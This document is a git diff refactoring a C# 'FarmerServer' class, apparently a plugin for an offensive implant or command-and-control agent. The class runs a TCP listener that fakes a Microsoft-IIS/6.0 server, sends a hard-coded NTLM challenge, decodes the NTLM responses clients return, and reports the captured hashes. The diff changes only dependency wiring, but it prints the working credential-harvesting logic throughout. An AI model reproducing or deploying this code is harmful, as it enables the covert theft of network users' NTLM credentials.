@@ -1,12 +1,21 @@
-﻿using System.Net.Sockets;
+﻿using Agent.Interfaces;
+using System.Net.Sockets;
 using System.Text;
 
 namespace Agent
 {
-    class FarmerServer
+    public class FarmerServer
     {
+        private ILogger logger { get; set; }
+        private IMessageManager messageManager { get; set; }
         private TcpListener _listener;
-
+        private string task_id { get; set; }
+        public FarmerServer(ILogger logger, IMessageManager manager, string task_id)
+        {
+            this.logger = logger;
+            this.messageManager = manager;
+            this.task_id = task_id;
+        }
         public void Initialize(int port)
         {
             _listener = new TcpListener(System.Net.IPAddress.Any, port);
@@ -38,11 +47,11 @@ namespace Agent
                 {
                     if (e.ToString().Contains("WSACancelBlockingCall"))
                     {
-                        Plugin.messageManager.Write(Environment.NewLine + "Server Stopped", Config.task_id, true);
+                        this.messageManager.Write(Environment.NewLine + "Server Stopped", this.task_id, true);
                     }
                     else
                     {
-                        Plugin.messageManager.Write(e.ToString(), Config.task_id, true, "error");
+                        this.messageManager.Write(e.ToString(), this.task_id, true, "error");
 
                     }
                 }
@@ -107,18 +116,18 @@ namespace Agent
             {
                 if (e.ToString().Contains("WSACancelBlockingCall"))
                 {
-                    Plugin.messageManager.Write(Environment.NewLine + "Server Stopped", Config.task_id, true);
+                    this.messageManager.Write(Environment.NewLine + "Server Stopped", this.task_id, true);
                 }
                 else
                 {
-                    Plugin.messageManager.Write(e.ToString(), Config.task_id, true, "error");
+                    this.messageManager.Write(e.ToString(), this.task_id, true, "error");
 
                 }
                 this.Stop();
             }
         } // End HandleClientWorker
 
-        private static string HandleWebRequest(string method, string uri, string httpVersion, Dictionary<string, string> headers, string body)
+        private string HandleWebRequest(string method, string uri, string httpVersion, Dictionary<string, string> headers, string body)
         {
             if (headers.ContainsKey("authorization") == false)
             {
@@ -139,7 +148,7 @@ namespace Agent
                         var NTLMHashString = DecodeNTLM(NTLMHash);
                         sb.AppendLine("[*] Capture hash:");
                         sb.AppendLine(NTLMHashString);
-                        Plugin.messageManager.Write(sb.ToString(), Config.task_id, false);
+                        this.messageManager.Write(sb.ToString(), this.task_id, false);
                         return "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: Close\r\nContent-Length: 11\r\n\r\nNot Found\r\n";
                     }
                 }
@@ -148,7 +157,7 @@ namespace Agent
             return "HTTP/1.1 401 Unauthorized\r\nServer: Microsoft-IIS/6.0\r\nContent-Type: text/html\r\nWWW-Authenticate: NTLM TlRMTVNTUAACAAAABgAGADgAAAAFAomiESIzRFVmd4gAAAAAAAAAAIAAgAA+AAAABQLODgAAAA9TAE0AQgACAAYAUwBNAEIAAQAWAFMATQBCAC0AVABPAE8ATABLAEkAVAAEABIAcwBtAGIALgBsAG8AYwBhAGwAAwAoAHMAZQByAHYAZQByADIAMAAwADMALgBzAG0AYgAuAGwAbwBjAGEAbAAFABIAcwBtAGIALgBsAG8AYwBhAGwAAAAAAA==\r\nConnection: Close\r\nContent-Length: 0\r\n\r\n";
         } // End HandleWebRequest
 
-        private static string DecodeNTLM(byte[] NTLM)
+        private string DecodeNTLM(byte[] NTLM)
         {
             var LMHash_len = BitConverter.ToInt16(NTLM, 12);
             var LMHash_offset = BitConverter.ToInt16(NTLM, 16);
